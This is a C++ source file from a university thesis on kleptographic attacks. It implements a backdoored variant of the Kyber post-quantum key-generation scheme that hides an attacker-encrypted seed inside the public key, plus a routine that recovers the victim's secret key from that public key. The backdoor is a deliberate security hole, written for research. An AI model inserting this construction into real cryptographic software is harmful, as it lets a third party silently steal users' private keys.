/**
 * Universidad de La Laguna
 * Escuela Superior de Ingeniería y Tecnología
 * Grado en Ingeniería Informática
 * Trabajo de Fin de Grado - Kleptographic Attacks on Lattice-Based CryptoSystems
 *
 * @author Omar Suárez Doro
 * @date August 20 2024
 * @version v0.1.0
 * @brief This file contains the definition of the methods of the KletoKyber class 
 */

#include "./KleptoKyber.h"

KleptoKyber::KleptoKyber(int option, Bytes attacker_pk, Bytes attacker_sk, const std::vector<int>& seed) : Kyber(option, seed) {
  attacker_pk_ = attacker_pk;
  attacker_sk_ = attacker_sk;
}

Bytes KleptoKyber::RunBackdoor() {
  // We use the public key of the attacker to encrypt the shared secret
  std::pair<Bytes, Bytes> pair_ct_sharedm = cypher_box->Encrypt(attacker_pk_); // 96 bytes = 768 bits  
  // std::cout << "Ciphertext: " << pair_ct_sharedm.first.FromBytesToHex() << std::endl;
  Bytes seed_a = GenerateSeed_(KyberConstants::SeedSize);
  Bytes seed_b = pair_ct_sharedm.second;
  Matrix<Polynomial<int>> a = ntt_->GenerateMatrix_(k_, seed_a, true);
  int N = 0;
  std::pair<Matrix<Polynomial<int>>, int> pair_s_counter = sampling_unit_->GenerateDistribuitionMatrix(seed_b, n1_, N);
  std::cout << pair_s_counter.first << std::endl;
  Matrix<Polynomial<int>> s_ntt = applyNTTMatrix_(pair_s_counter.first, k_);
  std::pair<Matrix<Polynomial<int>>, int> pair_e_counter = sampling_unit_->GenerateDistribuitionMatrix(seed_b, n1_, pair_s_counter.second);
  Matrix<Polynomial<int>> e_ntt = applyNTTMatrix_(pair_e_counter.first, k_);
  // Start of the backdoor

  // 1. t = INTT(â ◦ NTT(s)) + e
  Matrix<Polynomial<int>> t = applyNTTMatrix_(ntt_->multMatrixViaNTT(a, s_ntt), k_, false) + e_ntt;
  // ctbd = (bt0 , bt1 , . . . , btb ); c = ⌈b/(k · n)⌉
  int b = pair_ct_sharedm.first.GetBytesSize() * BYTE_SIZE;
  int c = b / (k_ * n_) + 1;
  // Initialize the polynomial p with c length
  Polynomial<int> p(k_ * n_);
  int size_p_without_zeros = b / c;
  // 2. Pack the bits of the ciphertext into the polynomial p
  p = PackBitsIntoPolynomial_(pair_ct_sharedm.first, t, c);
  // 3. Compute the compensation polynomial
  Polynomial<int> t_polynomial = t.GetPolynomialFromMatrix(n_);
  Polynomial<int> h = ComputeCompensation_(p, t_polynomial, c);
  // 4. t' = t + h
  Polynomial<int> t_prime = t_polynomial + h;
  // 5. Checks
  bool is_working_well = IsWorkingWell_(p, t_polynomial, h, c);
  if (!is_working_well) {
    std::cerr << "Error: The backdoor is not working well" << std::endl;
    exit(1);
  }
  
  // 6. Convert t' into a matrix
  Matrix<Polynomial<int>> t_prime_matrix(k_, 1);
  int current_row = 0;
  for (int i = 0; i < t_prime.GetSize(); i += n_) {
    t_prime_matrix(current_row, 0) = ntt_->NTT_Kyber(t_prime.GetSubPolynomial(i, i + n_), true);
    current_row++;
  }
  return seed_a + encdec_unit_->EncodeMatrixToBytes(t_prime_matrix, 12);
}



Matrix<Polynomial<int>> KleptoKyber::recoverSecretKey(const Bytes& pk) {
  Bytes seed_a = pk.GetNBytes(0, 32);
  Bytes t_prime_bytes = pk.GetNBytes(32, pk.GetBytesSize() - 32);
  // 1. Recover t'
  Matrix<Polynomial<int>> t_prime = encdec_unit_->DecodeBytesToMatrix(t_prime_bytes, k_, 1, 12);
  // 2. Apply the INTT to t'
  t_prime = applyNTTMatrix_(t_prime, k_, false); 

  // Number of cyphertext bits
  int b = KyberConstants::CtSize;
  // Number of bits per coefficient
  int c = b / (k_ * n_) + 1;

  Polynomial<int> t_prime_polynomial = t_prime.GetPolynomialFromMatrix(n_);

  // 3. Reconstruct polynomial p from t_prime
  int size_of_p_without_zeros = b / c + 1;
  Polynomial<int> p(k_ * n_);
  for (int i = 0; i < size_of_p_without_zeros; ++i) {
    p[i] = t_prime_polynomial[i] % (2 << c - 1);
  }

  std::string recovered_ct_str = "";
  for (int i = 0; i < (size_of_p_without_zeros - 1); ++i) {
    std::string bits = std::bitset<2>(p[i]).to_string();
    std::reverse(bits.begin(), bits.end());
    recovered_ct_str += bits;
  }
  
  Bytes recovered_ct = Bytes::FromBitsToBytes(recovered_ct_str);

  // std::cout << "Ciphertext: " << recovered_ct.FromBytesToHex() << std::endl;

  Bytes m_prime = cypher_box->Decrypt(recovered_ct, attacker_sk_);
  
  std::pair<Matrix<Polynomial<int>>, int> result_sk_n = sampling_unit_->GenerateDistribuitionMatrix(m_prime, n1_, 0);
  return result_sk_n.first;
}



Polynomial<int> KleptoKyber::PackBitsIntoPolynomial_(const Bytes& ct, const Matrix<Polynomial<int>>& t, int c) {
  int b = ct.GetBytesSize() * BYTE_SIZE;
  int size_p_without_zeros = b / c;
  Polynomial<int> p(k_ * n_);
  for (int i = 0; i < size_p_without_zeros; ++i) {
    p[i] = 0;
    for (int j = i * c; j < (i + 1) * c; ++j) { // TODO: need to know if we need to include the last bit or not
      // Extract the bit from the corresponding position of the ciphertext
      int bit_j = ct.GetBit(j);
      // Pack this bit into the coefficient p[i] using bit shifting.
      p[i] += bit_j * (1 << (j - i * c));
    }
  }
  return p;
}


Polynomial<int> KleptoKyber::ComputeCompensation_(const Polynomial<int>& p, const Polynomial<int>& t_polynomial, int c) {
  Polynomial<int> h(k_ * n_);
  for (int i = 0; i < p.GetSize(); ++i) {
    h[i] = (p[i] - t_polynomial[i])  % (2 << c - 1);
  }
  return h;
}

bool KleptoKyber::IsWorkingWell_(const Polynomial<int>& p, const Polynomial<int>& t_polynomial, const Polynomial<int>& h, int c) {
  for (int i = 0; i < p.GetSize(); ++i) {
    if ((p[i] - t_polynomial[i]) % (2 << c - 1) != h[i]) {
      return false;
    }
  }
  return true;
}